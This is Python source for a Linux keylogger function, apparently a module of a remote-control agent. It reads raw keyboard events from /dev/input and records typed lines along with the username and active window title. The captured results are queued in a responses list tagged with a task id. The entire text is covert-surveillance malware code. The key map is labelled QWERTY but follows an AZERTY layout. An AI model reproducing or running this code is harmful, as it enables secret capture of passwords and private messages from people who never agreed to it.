def keylog_no_X(task_id):

    global responses   


    def get_active_window_title():
        root = subprocess.Popen(['xprop', '-root', '_NET_ACTIVE_WINDOW'], stdout=subprocess.PIPE)
        stdout, stderr = root.communicate()

        m = re.search(b'^_NET_ACTIVE_WINDOW.* ([\w]+)$', stdout)
        if m != None:
            window_id = m.group(1)
            window = subprocess.Popen(['xprop', '-id', window_id, 'WM_NAME'], stdout=subprocess.PIPE)
            stdout, stderr = window.communicate()
        else:
            return "None"

        match = re.match(b"WM_NAME\(\w+\) = (?P<name>.+)$", stdout)
        if match != None:
            return match.group("name").strip(b'"').decode()

        return "None"

    def find_event():

        f = open("/proc/bus/input/devices")
        lines = str(f.readlines())

        while lines.find("I:") != -1:
            #Read block by block
            event = ""
            start = lines.find("I:")
            end = lines.find("B: EV=")+12

            if lines[start:end].find("B: EV=12001") != -1:
                event_start = lines[start:end].find("event")
                event_start += start   

                i = 1
                try:
                    while True:
                        int(lines[event_start + 5 : event_start + 5 + i])
                        event = lines[event_start: event_start + 5 + i]
                        i += 1
                except:
                    return event

            lines = lines[end-6:]



    qwerty_map = {
        2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
        11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "a", 17: "z",
        18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "^",
        27: "$", 28: "\n", 29: "[CTRL]", 30: "q", 31: "s", 32: "d", 33: "f", 34: "g",
        35: "h", 36: "j", 37: "k", 38: "l", 39: "m", 40: "ù", 41: "*", 42: "[SHIFT]",
        43: "<", 44: "w", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: ",",
        51: ";", 52: ":", 53: "!", 54: "[SHIFT]", 55: "FN", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
    }


    print(find_event())
    infile_path = "/dev/input/" + find_event().strip()

    FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(FORMAT)

    in_file = open(infile_path, "rb")

    event = in_file.read(EVENT_SIZE)

    line = ""

    while event:

        if break_function:
            print("break detected, stopping keylog")
            response = {
                "task_id": task_id,
                "user": getpass.getuser(), 
                "window_title": get_active_window_title(), 
                "keystrokes": line,
                "completed": True
            }
            responses.append(response)
            break_function = False
            return

        (_, _, type, code, value) = struct.unpack(FORMAT, event)

        if code != 0 and type == 1 and value == 1:

            if code == 28 or code == 96:
                response = {
                    "task_id": task_id,
                    "user": getpass.getuser(), 
                    "window_title": get_active_window_title(), 
                    "keystrokes": line + "\n",
                }
                responses.append(response)
                line = ""
            else: 
                line += qwerty_map[code]

        event = in_file.read(EVENT_SIZE)